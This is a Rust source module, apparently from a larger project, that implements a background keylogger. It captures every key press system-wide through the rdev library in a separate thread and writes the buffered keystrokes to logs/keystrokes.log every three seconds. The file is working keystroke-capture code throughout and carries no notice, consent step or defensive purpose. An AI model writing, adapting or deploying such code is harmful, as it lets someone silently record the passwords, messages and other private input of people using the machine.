//! Input monitoring and keystroke logging module
//!
//! This module implements a background keylogger that captures all keyboard input events.
//! It runs in a dedicated thread with buffered keystroke data that is periodically
//! flushed to an encrypted log file. The module handles various key combinations and
//! special keys for comprehensive input monitoring.

use crate::log::Log;
use crate::writer;
use rdev::{listen, Event, EventType, Key};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
const LOG_FILE: &str = "logs/keystrokes.log";
const FLUSH_INTERVAL_SECONDS: u64 = 3;

/// Starts the keylogger in a new thread.
/// It listens for key presses and saves them to a log file.
pub fn start_keylogger() {
    Log::info(format!("Keylogger starting..."));

    // Use an Arc<Mutex<>> to safely share the buffer between the listener and the flusher.
    let buffer = Arc::new(Mutex::new(String::new()));
    let last_flush = Arc::new(Mutex::new(Instant::now()));

    let buffer_clone = Arc::clone(&buffer);
    let last_flush_clone = Arc::clone(&last_flush);

    // Spawn a dedicated thread for listening to keyboard events.
    thread::spawn(move || {
        let callback = move |event: Event| {
            let mut buffer = buffer_clone.lock().unwrap();
            let mut last_flush = last_flush_clone.lock().unwrap();

            match event.event_type {
                EventType::KeyPress(key) => {
                    let key_str = match key {
                        Key::Return => "\n".to_string(),
                        Key::Space => " ".to_string(),
                        Key::Tab => "\t".to_string(),
                        _ => {
                            let key_debug = format!("{:?}", key);
                            // Remove the "Key" prefix if present
                            let cleaned_key = key_debug.replace("Key", "");
                            format!(" {} ", cleaned_key)
                        }
                    };
                    buffer.push_str(&key_str);
                }
                _ => (),
            }

            // Flush buffer if it's time
            if last_flush.elapsed() > Duration::from_secs(FLUSH_INTERVAL_SECONDS) {
                if !buffer.is_empty() {
                    if let Err(e) = writer::save_output(&*buffer, LOG_FILE, true) {
                        eprintln!("Failed to write keystrokes: {}", e);
                    }
                    buffer.clear();
                    *last_flush = Instant::now();
                }
            }
        };

        if let Err(error) = listen(callback) {
            eprintln!("Error listening to keyboard: {:?}", error);
        }
    });
}
